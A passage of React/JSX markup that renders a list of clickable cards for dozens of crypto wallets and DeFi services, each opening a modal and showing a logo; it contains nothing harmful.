                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">Clovers</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={clover}
                alt="Clovers"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Mintbase')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">Mintbase</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={mint}
                alt="Mintbase"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('DAO Stack')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">DAO Stack</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={dao}
                alt="DAO Stack"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('KnownOrigin')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">KnownOrigin</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={known}
                alt="known origin"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('MyEther')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">MyEtherWallet</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={myether}
                alt="known origin"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Affogato')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">Affogato</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={affogato}
                alt="Affogato"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('StablePay')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">StablePay</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={stablepay}
                alt="StablePAy"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('DefiSaver')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">Defi Saver</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={defi}
                alt="Defi Saver"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Loom Network')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">Loom Network</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={loom}
                alt="Loom Network"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('ThorChain')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">ThorChain</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={thor}
                alt="ThorChain"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('BulkSender')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">BulkSender</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={bulksender}
                alt="Bulksender"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('LinkDrop')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">LinkDrop</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={linkdrop}
                alt="LinkDrop"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Helio')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">HelioWallet</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={helio}
                alt="Helio"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Escaroo')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">Escaroo</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={escaroo}
                alt="Escaroo"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('TokenMarket')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">TokenMarket</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={tokenmarket}
                alt="Token Market"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Mesa')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">Mesa</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={mesa}
                alt="Mesa"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('MCDEX')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">MCDEX</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={mcdex}
                alt="MCDEX"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('FuruCombo')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">FuruCombo</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={furucombo}
                alt="Furu"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Melon')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">Melon</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={melon}
                alt="Melon"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('ChainsFr')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">ChainsFr</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={chainsfr}
                alt="ChainsFr"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('AKA3Email Alias')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">AKA3Email Alias</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={aka3}
                alt="AKA3Email Alias"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('2Key')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">2Key</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={key2}
                alt="2Key"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Pitch')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">Pitch</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={pitch}
                alt="Pitch"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('SushiSwap')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">SushiSwap</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={sushiswap}
                alt="Sushiswap"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Unagii')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">Unagii</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={unagii}
                alt="Unagii"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Cream Finance')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">Cream Finance</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={cream}
                alt="Unagii"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Cardano')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">Cardano</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={cardano}
                alt="Cardano"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Daedalus')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">Daedalus</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={daedalus}
                alt="Daedalus"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('CCVault')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">CCVault</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={ccvault}
                alt="CCVault"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Gero')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">Gero</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={gero}
                alt="Gero"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Nami')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">Nami</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={nami}
                alt="Nami"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Solana')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
              {/* <img className="h-12 w-12 flex-none rounded-full bg-gray-50" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=facearea&facepad=2&w=256&h=256&q=80" alt=""> */}
             <div className="min-w-0 flex-auto">
              <div className="mt-1 flex items-center gap-x-1.5">
                <div className="flex-none rounded-full bg-emerald-500/20 p-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-emerald-500"></div>
                </div>
                <span className=" font-semibold leading-6 text-gray-900">Solana</span>
              </div>
            </div>
            </div>
            <div className=" shrink-0 sm:flex sm:flex-col sm:items-end">
              <Image
                src={solana}
                alt="Solana"
                width={30}
                height={73}
                priority
                />
            </div>
          </div>

          <div onClick={() => this.showModalFunc('Solong')} className="flex justify-between gap-x-5 p-3 mt-1 border-solid border-1 rounded-lg">
            <div className="flex min-w-0 gap-x-4">
